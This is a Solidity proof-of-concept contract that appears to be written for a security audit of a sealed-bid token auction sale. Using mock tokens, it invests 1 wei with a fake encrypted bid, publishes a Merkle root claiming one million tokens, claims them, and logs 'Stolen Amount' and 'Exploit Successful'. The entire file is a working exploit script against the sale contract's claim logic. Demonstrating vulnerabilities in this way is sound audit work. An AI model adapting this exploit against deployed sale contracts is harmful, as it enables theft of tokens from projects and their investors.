// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {Merkle} from "https://github.com/dmfxyz/murky/blob/main/src/Merkle.sol";
import {LegionSealedBidAuctionSale} from "../../src/sales/LegionSealedBidAuctionSale.sol";
import {LegionVestingManager} from "../../src/vesting/LegionVestingManager.sol";
import {ILegionSealedBidAuctionSale} from "../../src/interfaces/sales/ILegionSealedBidAuctionSale.sol";
import {ILegionAbstractSale} from "../../src/interfaces/sales/ILegionAbstractSale.sol";
import {Point} from "../../src/lib/ECIES.sol";
import {MockERC20} from "../../mocks/MockERC20.sol";

contract BP_Violation {
    event Log(string message, uint256 value);
    event LogString(string message);

    LegionSealedBidAuctionSale public sale;
    MockERC20 public usdc;
    MockERC20 public projectToken;
    Merkle public merkle;

    uint256 public constant ATTACK_INVEST_AMOUNT = 1;
    uint256 public constant FAKE_OFFCHAIN_AMOUNT = 1_000_000 * 1e6;
    uint256 public constant CLAIMABLE_TOKENS = 1_000_000 * 1e18;

    constructor() {
        merkle = new Merkle();
        usdc = new MockERC20("USDC", "USDC", 6);
        projectToken = new MockERC20("Project Token", "PROJ", 18);
    }

    function runExploit() external {
        sale = new LegionSealedBidAuctionSale();

        Point memory dummyPublicKey = Point({
            x: 123456,
            y: 123456
        });

        ILegionSealedBidAuctionSale.SealedBidAuctionSaleInitializationParams memory sealedBidParams =
            ILegionSealedBidAuctionSale.SealedBidAuctionSaleInitializationParams({
                publicKey: dummyPublicKey
            });

        ILegionAbstractSale.LegionSaleInitializationParams memory saleInitParams =
            ILegionAbstractSale.LegionSaleInitializationParams({
                askToken: address(projectToken),
                bidToken: address(usdc),
                recipient: address(this),
                salePeriodSeconds: 1 days,
                refundPeriodSeconds: 1 days,
                minRaise: 0,
                maxRaise: type(uint256).max,
                minAskAmount: 0
            });

        sale.initialize(saleInitParams, sealedBidParams);

        projectToken.mint(address(sale), CLAIMABLE_TOKENS);

        usdc.mint(address(this), ATTACK_INVEST_AMOUNT);
        usdc.approve(address(sale), ATTACK_INVEST_AMOUNT);

        bytes memory fakeSealedBid = abi.encode("Encrypted: 1,000,000 USDC");

        emit LogString("Step 1: Investing 1 wei...");
        sale.invest(ATTACK_INVEST_AMOUNT, fakeSealedBid);

        emit LogString("Step 2: Backend generates Merkle Root based on FAKE amount...");

        uint256 positionId = 1;

        LegionVestingManager.LegionInvestorVestingConfig memory vestingConfig =
            LegionVestingManager.LegionInvestorVestingConfig({
                tokenAllocationOnTGERate: 10000,
                vestingDuration: 0,
                vestingType: 0
            });

        bytes32[] memory leafs = new bytes32[](1);
        leafs[0] = keccak256(bytes.concat(keccak256(abi.encode(
            address(this),
            CLAIMABLE_TOKENS,
            positionId,
            vestingConfig
        ))));

        bytes32 root = merkle.getRoot(leafs);
        bytes32[] memory proof = merkle.getProof(leafs, 0);

        sale.publishSaleResults(root, bytes32(0), bytes32(0));

        emit LogString("Step 3: Claiming tokens...");

        uint256 balanceBefore = projectToken.balanceOf(address(this));

        sale.claimTokenAllocation(
            CLAIMABLE_TOKENS,
            vestingConfig,
            proof
        );

        uint256 balanceAfter = projectToken.balanceOf(address(this));

        uint256 stolen = balanceAfter - balanceBefore;
        emit Log("Stolen Amount:", stolen);

        require(stolen == CLAIMABLE_TOKENS, "Exploit Failed: Token amount mismatch");
        emit LogString("Exploit Successful: Stole 1M tokens with 1 wei cost.");
    }
}